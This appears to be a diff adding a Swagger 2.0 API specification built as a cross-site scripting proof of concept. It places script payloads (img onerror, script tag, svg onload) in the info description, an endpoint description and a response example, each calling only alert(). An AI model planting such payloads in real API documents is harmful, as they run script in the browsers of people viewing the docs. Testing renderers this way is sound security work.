@@ -1,0 +1,30 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "XSS PoC API",
+    "version": "1.0.0",
+    "description": "Testing XSS injection <img src=x onerror=\"alert('Swagger UI XSS PoC')\">"
+  },
+  "schemes": ["https"],
+  "basePath": "/",
+  "paths": {
+    "/hello": {
+      "get": {
+        "summary": "Say hello",
+        "description": "This should trigger the PoC <script>alert('Hello from description')</script>",
+        "responses": {
+          "200": {
+            "description": "OK",
+            "schema": {
+              "type": "object",
+              "properties": { "message": { "type": "string" } }
+            },
+            "examples": {
+              "application/json": { "message": "<svg/onload=alert('Example field XSS')>" }
+            }
+          }
+        }
+      }
+    }
+  }
+}
